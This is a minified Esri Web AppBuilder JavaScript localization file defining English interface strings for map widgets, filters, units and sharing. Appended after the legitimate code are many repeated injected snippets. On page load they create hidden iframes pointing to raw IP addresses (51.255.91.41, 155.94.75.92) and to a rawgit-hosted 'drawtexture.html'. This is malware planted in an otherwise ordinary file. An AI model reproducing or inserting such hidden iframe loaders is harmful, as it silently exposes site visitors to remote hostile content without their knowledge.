// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({root:{common:{apply:"Apply",ok:"OK",cancel:"Cancel",yes:"Yes",no:"No",next:"Next",previous:"Previous",back:"Back",selected:"selected",name:"Name",usage:"Usage",settings:"Settings",home:"Home",link:"Link",messages:"Messages",outputs:"Outputs",title:"Title",thumbnail:"Thumbnail",url:"URL",actions:"Actions",layer:"Layer",action:"Action",input:"Input",output:"Output",type:"Type",required:"Required",options:"Options",label:"Label",tooltip:"Tooltip",visible:"Visible",symbol:"Symbol",popup:"Popup",
upload:"Upload",execute:"Execute",help:"Help",executing:"Executing",clear:"Clear",error:"Error",zoomTo:"Zoom to",attribute:"Attribute",exports:"Export",check:"Check",save:"Save",close:"Close",deleteText:"Delete",map:"Map",scene:"Scene",reset:"Reset",icon:"Icon",folder:"Folder",share:"Share",view:"View",newText:"New",edit:"Edit",wkid:"WKID",table:"Table",zoomIn:"Zoom in",zoomOut:"Zoom out",continue1:"Continue",longitude:"Longitude",latitude:"Latitude",custom:"Custom",image:"Image",font:"Font",text:"Text",
all:"All",number:"Number",percentage:"Percentage",unit:"Unit",thousand:"Thousand",billion:"Billion",million:"Million",none:"None",field:"Field",operation:"Operation",disableUpdateGeometry:"Disable Update Geometry",preview:"Preview",date:"Date",time:"Time",show:"Show",hide:"Hide",format:"Format",defaults:"Default",add:"Add",done:"Done",remove:"Remove",leave:"Leave",stay:"Stay"},errorCode:"Code",errorMessage:"Message",errorDetail:"Detail",widgetPlaceholderTooltip:"To set it up, go to Widgets and click corresponding placeholder",
fieldStatistics:{selectField:"Select field",statistics:"Statistics",field:"Field",count:"Number of values",sum:"Sum of values",min:"Minimum",max:"Maximum",ave:"Average",stddev:"Standard deviation"},symbolChooser:{preview:"Preview",basic:"Basic",arrows:"Arrows",business:"Business",cartographic:"Cartographic",damage:"Damage",disasters:"Disasters",emergencyManagement:"Emergency Management",generalInfrastructure:"General Infrastructure",localGovernment:"Local Government",nationalParkService:"National park service",
numbers:"Numbers",outdoorRecreation:"Outdoor recreation",peoplePlaces:"People places",pointsOfInterest:"Points of Interest",safetyHealth:"Safety health",stateGovernment:"State Government",shapes:"Shapes",transportation:"Transportation",symbolSize:"Symbol size",color:"Color",alpha:"Alpha",outlineColor:"Outline color",outlineWidth:"Outline width",style:"Style",width:"Width",text:"Text",fontColor:"Font color",fontSize:"Font size",transparency:"Transparency",solid:"Solid",dash:"Dash",dot:"Dot",dashDot:"Dash dot",
dashDotDot:"Dash dot dot",customImage:"Custom image",chooseFile:"Choose file",noFileChoosen:"No file chosen."},transparency:{opaque:"Opaque",transparent:"Transparent"},rendererChooser:{domain:"Domain",use:"Use",singleSymbol:"A single symbol",uniqueSymbol:"Unique symbols",color:"Color",size:"Size",toShow:"To show",colors:"Colors",classes:"Classes",symbolSize:"Symbol size",addValue:"Add value",setDefaultSymbol:"Set default symbol",defaultSymbol:"Default symbol",selectedSymbol:"Selected symbol",value:"Value",
label:"Label",range:"Range"},drawBox:{point:"Point",line:"Line",polyline:"Polyline",freehandPolyline:"Freehand polyline",triangle:"Triangle",extent:"Extent",circle:"Circle",ellipse:"Ellipse",polygon:"Polygon",freehandPolygon:"Freehand polygon",text:"Text",clear:"Clear"},popupConfig:{title:"Title",add:"Add",fields:"Fields",noField:"No field",visibility:"Visible",name:"Name",alias:"Alias",actions:"Actions"},includeButton:{include:"Include"},loadingShelter:{loading:"Loading"},basicServiceBrowser:{noServicesFound:"No service was found.",
unableConnectTo:"Unable to connect to",invalidUrlTip:"The URL you have entered is invalid or inaccessible."},serviceBrowser:{noGpFound:"No geoprocessing service was found.",unableConnectTo:"Unable to connect to"},layerServiceBrowser:{noServicesFound:"No map service or feature service was found.",unableConnectTo:"Unable to connect to"},basicServiceChooser:{validate:"Validate",example:"Example",set:"Set"},urlInput:{invalidUrl:"Invalid URL."},urlComboBox:{invalidUrl:"Invalid URL."},filterBuilder:{addAnotherExpression:"Add expression",
addSet:"Add set",matchMsg:"Get features in the layer that match ${any_or_all} of the following expressions",matchMsgSet:"${any_or_all} of the following expressions in this set are true",all:"All",any:"Any",value:"Value",field:"Field",unique:"Unique",none:"None",and:"and",valueTooltip:"Enter value",fieldTooltip:"Pick from an existing field",uniqueValueTooltip:"Pick from unique values in the selected field",stringOperatorIs:"is",stringOperatorIsNot:"is not",stringOperatorStartsWith:"starts with",stringOperatorEndsWith:"ends with",
stringOperatorContains:"contains",stringOperatorDoesNotContain:"does not contain",stringOperatorIsBlank:"is blank",stringOperatorIsNotBlank:"is not blank",dateOperatorIsOn:"is on",dateOperatorIsIn:"is in",dateOperatorIsNotIn:"is not in",dateOperatorIsNotOn:"is not on",dateOperatorIsBefore:"is before",dateOperatorIsAfter:"is after",dateOperatorIsOnOrBefore:"is on or before",dateOperatorIsOnOrAfter:"is on or after",dateOperatorMinutes:"minutes",dateOperatorHours:"hours",dateOperatorDays:"days",dateOperatorWeeks:"weeks",
dateOperatorMonths:"months",dateOperatorYears:"years",dateOperatorInTheLast:"in the last",dateOperatorNotInTheLast:"not in the last",dateOperatorIsBetween:"is between",dateOperatorIsNotBetween:"is not between",dateOperatorIsBlank:"is blank",dateOperatorIsNotBlank:"is not blank",numberOperatorIs:"is",numberOperatorIsNot:"is not",numberOperatorIsAtLeast:"is at least",numberOperatorIsLessThan:"is less than",numberOperatorIsAtMost:"is at most",numberOperatorIsGreaterThan:"is greater than",numberOperatorIsBetween:"is between",
numberOperatorIsNotBetween:"is not between",numberOperatorIsBlank:"is blank",numberOperatorIsNotBlank:"is not blank",string:"String",number:"Number",date:"Date",askForValues:"Ask for values",prompt:"Prompt",hint:"Hint",error:{invalidParams:"Invalid parameters.",invalidUrl:"Invalid URL.",noFilterFields:"The layer has no fields that can be used for creating filters.",invalidSQL:"Invalid SQL expression.",cantParseSQL:"Can't parse the SQL expression."},caseSensitive:"Case sensitive",notSupportCaseSensitiveTip:"Hosted services do not support case-sensitive query.",
setFilterTip:"Please set filters correctly.",listValues:"List values",cascadeFilterTip:"Only show values filtered by previous expressions.",noneCascadeFilterTip:"All unique values of this field",previousCascadeFilterTip:"Values filtered by previous expressions",allCascadeFilterTip:"Values filtered by all other expressions",custom:"the date...",today:"today",yesterday:"yesterday",tomorrow:"tomorrow",thisWeek:"this week",thisMonth:"this month",thisQuarter:"this quarter",thisYear:"this year",inputType:"Input type",
setInputType:"Set input type"},featureLayerSource:{layer:"Layer",browse:"Browse",selectFromMap:"Map",selectFromPortal:"Portal for ArcGIS",addServiceUrl:"Service URL",inputLayerUrl:"Input layer URL",selectLayer:"Select a feature layer from current map.",chooseItem:"Choose a feature layer item.",setServiceUrl:"Enter the URL of a feature service or a map service.",selectFromOnline:"ArcGIS Online",chooseLayer:"Choose a feature layer."},queryableLayerSource:{layer:"Layer",browse:"Browse",selectFromMap:"Map",
selectFromPortal:"Portal for ArcGIS",addServiceUrl:"Service URL",inputLayerUrl:"Input layer URL",selectLayer:"Select a layer from current map.",chooseItem:"Choose an item.",setServiceUrl:"Enter the URL of the service.",selectFromOnline:"ArcGIS Online",chooseLayer:"Choose a layer."},gpSource:{selectFromPortal:"Portal for ArcGIS",addServiceUrl:"Service URL",selectFromOnline:"ArcGIS Online",setServiceUrl:"Enter the URL of a geoprocessing service.",chooseItem:"Choose a geoprocessing service item.",chooseTask:"Choose a geoprocessing task."},
itemSelector:{map:"Map",selectWebMap:"Choose web map",addMapFromOnlineOrPortal:"Find and add a web map in the application from ArcGIS Online public resources or your private content in ArcGIS Online or Portal.",searchMapName:"Search by map name...",searchNone:"We couldn't find what you were looking for. Please try again.",groups:"Groups",noneGroups:"No groups",signInTip:"Your login session has expired, please refresh your browser to sign in to your portal again.",signIn:"Sign in",publicMap:"Public",
myOrganization:"My Organization",myGroup:"My Groups",myContent:"My Content",count:"Count",fromPortal:"from Portal",fromOnline:"from ArcGIS.com",noneThumbnail:"Thumbnail not available",owner:"owner",signInTo:"Sign in to",lastModified:"Last modified",moreDetails:"More details",mostRecent:"Most recent",mostViewed:"Most viewed",highestRated:"Highest rated",viewItemDetails:"View item details"},featureLayerChooserFromPortal:{notSupportQuery:"The service doesn't support query."},basicLayerChooserFromMap:{noLayersTip:"There is no appropriate layer available in the map."},
layerInfosMenu:{titleBasemap:"Basemaps",titleLayers:"Operational layers",labelLayer:"Layer name",itemZoomTo:"Zoom to",itemTransparency:"Transparency",itemTransparent:"Transparent",itemOpaque:"Opaque",itemMoveUp:"Move up",itemMoveDown:"Move down",itemDesc:"Description",itemDownload:"Download",itemToAttributeTable:"View in Attribute Table"},imageChooser:{unsupportReaderAPI:"Todo: The browser does not suport file reader API",readError:"Failed to read the file.",unknowError:"unable to complete operations",
invalidType:"Invalid file type.",cropImage:"Crop Image",exceed:"File size cannot exceed 1024 KB",enableFlash:"Please enable Adobe Flash before browsing to an image.",cropWaining:"Please choose a photo that's at least ${width} x ${height} pixels.",toolTip:"For the best result, the image should be ${width} pixels wide by ${height} pixels high. Other sizes will be adjusted to fit. Acceptable image formats are: PNG, GIF and JPEG."},simpleTable:{moveUp:"Move up",moveDown:"Move down",deleteRow:"Delete",
edit:"Edit"},urlParams:{invalidToken:"Invalid token",validateTokenError:"Invalid token or Network error"},exportTo:{exportTo:"Export",toCSV:"Export to CSV file",toFeatureCollection:"Export to feature collection",toGeoJSON:"Export to GeoJSON"},appState:{title:"App State",restoreMap:"Click to restore the map extent and layers visibility where you left off."},featureActions:{featureActions:"Feature actions",ZoomTo:"Zoom to",PanTo:"Pan to",Flash:"Flash",ShowPopup:"Show pop-up",CreateLayer:"Create layer",
ShowStatistics:"Statistics...",ClearSelection:"Clear selection",ExportToCSV:"Export to CSV file",ShowSelectedFeature:"Show selected features",ExportToFeatureCollection:"Export to feature collection",ExportToGeoJSON:"Export to GeoJSON",EditAttributes:"Edit attributes",AddMarker:"Add a marker",RemoveMarker:"Remove marker",SaveToMyContent:"Save to My Content"},spatialFilterByFeatures:{relatedLayer:"Related layer",selectedFeatures:"Use selected features",drawShapesTip:"Draw shapes to select features",
pleaseDrawShapesTip:"Please draw shapes to select features",allFeaturesTip:"All features in the layer",selectFeaturesOrDrawShapesTip:"Please use selected features in this layer or draw shapes on the map to limit features."},searchDistance:{applySearchDistance:"Apply a search distance",applySearchDistanceToFeatures:"Apply a search distance to selected features"},units:{miles:"Miles",milesAbbr:"mi",kilometers:"Kilometers",kilometersAbbr:"km",feet:"Feet",feetAbbr:"ft",meters:"Meters",metersAbbr:"m",
yards:"Yards",yardsAbbr:"yd",acres:"Acres",acresAbbr:"acres",nauticalMiles:"Nautical miles",nauticalMilesAbbr:"nmi",uSSurveyFeet:"US survey feet",uSSurveyFeetAbbr:"ftUS",centimeters:"Centimeters",centimetersAbbr:"cm",inches:"Inches",inchesAbbr:"in",decimalDegree:"Decimal degrees",decimalDegreeAbbr:"dd",degreeMinuteSeconds:"Degree minute seconds",degreeMinuteSecondsAbbr:"d-m-s",squareMiles:"Square miles",squareMilesAbbr:"sq mi",squareKilometer:"Square kilometers",squareKilometerAbbr:"sq km",squareFeet:"Square feet",
squareFeetAbbr:"sq ft",squareMeters:"Square meters",squareMetersAbbr:"sq m",squareYards:"Square yards",squareYardsAbbr:"sq yd",squareUSSurveyFeet:"Square US survey feet",squareUSSurveyFeetAbbr:"sq ftUS"},timeUnit:{year:"Year",month:"Month",day:"Day",hour:"Hour",minute:"Minute",second:"Second"},featureSetChooser:{select:"Select",dragBox:"Drag",dragMouse:"Drag the mouse",selectByRectangle:"Select by rectangle",selectFeaturesTip:"Select features by dragging box around them on map",newSelectionTip:"Create new selection",
addSelectionTip:"Add to selection",removeSelectionTip:"Remove from selection",selectFromCurrentSelectionTip:"Select from the current selection",unselectAllSelectionTip:"Unselect all currently selected features",selectByPolygon:"Select by polygon",selectByCircle:"Select by circle",selectByLine:"Select by line",chooseSelectingTools:"Choose selecting tools",darw:"Draw",drawShap:"Draw a shape"},widgetManager:{createWidgetError:"Create widget error",createWidgetSettingPageError:"Create widget setting page error",
loadWidgetResourceError:"Load widget resouce error"},shareOptions:{shareMap:"Choose who can view this app",shareMapTips:"Your app is currently shared with these people",everyone:"Everyone",theseGroups:"These groups"},shareLink:{email:"email",shareEmail:"Email",facebook:"facebook",shareFacebook:"Facebook",twitter:"twitter",shareTwitter:"Twitter",googlePlus:"google+",shareGooglePlus:"Google+",EmbedTips:"Embed this app in a website",shareEmailSubject:"Sharing web app:",shareEmailTxt1:"Here is a web app shared with you by using Web AppBuilder for ArcGIS.",
shareEmailTxt2:"You can create and share your own web app with Esri Web AppBuilder for ArcGIS.",shareEmailTxt3:"Visit http://www.esri.com/software/web-appbuilder for details.",smallSize:"Small",mediumSize:"Medium",largeSize:"Large",customSize:"Custom",embed:"Embed this app in a website",more:"Embed options",changeShareSettings:"Change share settings",shareLinkText:"Share a link to this app",linkOptions:"Link options",linkOptionsUrlParameters:"Select URL parameters included in the link",currentMapExtent:"Current map extent",
chooseCenterWithLevel:"Click the map to define the center of the map with zoom level",chooseCenterWithScale:"Click the map to define the center of the map with map scale",findLocation:"Find the location or feature and zoom to it",findLocation_inputPlaceholder:"Your place or feature",queryFeature:"Query a feature and zoom to it",addMarker:"Add a marker on the map",addMarker_titlePlaceholder:"Title of the marker pop-up",addMarker_symbolURL:"Marker symbol URL",addMarker_label:"Marker label",popupTitle:"Pop-up title",
zoomLevel:"Zoom level",overwirteMobileLayout:"Overwrite default screen size of mobile layout",language:"Set display language of the app",auth:"Authenticate a user automatically",linkPreview:"Link preview",useShortenLink:"Short link",shareMapUrlExtent:"Share current map extent",shareToWebTips:"This app is not shared with the public. People might not be able to view it."},webSceneLoader:{webglSupportTip:"3D web apps are not supported in your browser."},map:{basemapNotAvailable:"Basemap is not available.",
displayDefaultBasemap:"Displaying the default basemap instead.",layerLoadedError:"The layer, ${layers} cannot be added to the map."},popup:{relatedTables:"Related tables:",relatedRecords:"Related records:",noRelatedRecotds:"No related records were found.",chooseFieldTip:"Choose an attribute to show the list",saveAsPopupTitle:"Same as the pop-up title",leaveConfirm:"Do you want to leave without saving edits?"},queryFeatures:{tooManyFeaturesTip:"There are too many features in your selection. It may take long time to retrieve and display them on the map.",
askForContinue:"Do you want to continue?"},colorPalette:{transparent:"Transparent",custom:"Custom"},temperature:{celsius:"Celsius",fahrenheit:"Fahrenheit"},report:{printButtonLabel:"Print",reportDimensionsMsg:"This report is designed to be printed on ${paperSize} Paper",unableToPrintMapMsg:"An error occurred while printing the map(s).",notesHint:"Enter comments here",landscape:"Landscape",portrait:"Portrait",mapOnly:"MAP_ONLY",a0:"A0",a1:"A1",a2:"A2",a3:"A3",a4:"A4",a5:"A5",letterANSIA:"Letter ANSI A",
tabloidANSIB:"Tabloid ANSI B",letter:"Letter",legal:"Legal",tabloid:"Tabloid",ansi_a:"ANSI A",ansi_b:"ANSI B",ansi_c:"ANSI C",ansi_d:"ANSI D",ansi_e:"ANSI E"},snapshot:{snapshot_complete:"Created snapshot successfully.",snapshot_failed:"Failed to create snapshot.",snapshot_append:"Snapshot",utc:"UTC"},statisticsChart:{enlarge:"Enlarge",setting:"Setting",count:"Count",horizontalAxis:"Horizontal axis",verticalAxis:"Vertical axis",dataLabels:"Data labels",color:"Color"},frameworkDatasource:{setDataSource:"Set data source",
customDataSource:"Extra data source",selectCustomDataTip:"Select a data source from this app.",widgetOutputs:"Widget outputs",noExtraDsAvailable:"No extra data sources available.",addExtraDsTip:"Go to the Attribute tab of the builder, and click Extra data source to add data.",widgetOutpusListTip:"Widget outputs (if any) are also listed here."},gridLayout:{addWidgetTip:"Add widgets here through the Widget tab",modifyLayout:"Modify layout",dragToAdd:"Drag to add",mapArea:"MAP AREA"},noEditPrivileges:"Your account does not have permission to create or modify data.",
invalidConfiguration:"Widget is either not configured or the layers in the configuration are no longer in the map.  Please open the app in the builder mode and reconfigure the widget."},ar:1,bs:1,cs:1,da:1,de:1,el:1,es:1,et:1,fi:1,fr:1,he:1,hi:1,hr:1,it:1,id:1,ja:1,ko:1,lt:1,lv:1,nb:1,nl:1,pl:1,"pt-br":1,"pt-pt":1,ro:1,ru:1,sl:1,sr:1,sv:1,th:1,tr:1,vi:1,"zh-cn":1,"zh-hk":1,"zh-tw":1});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});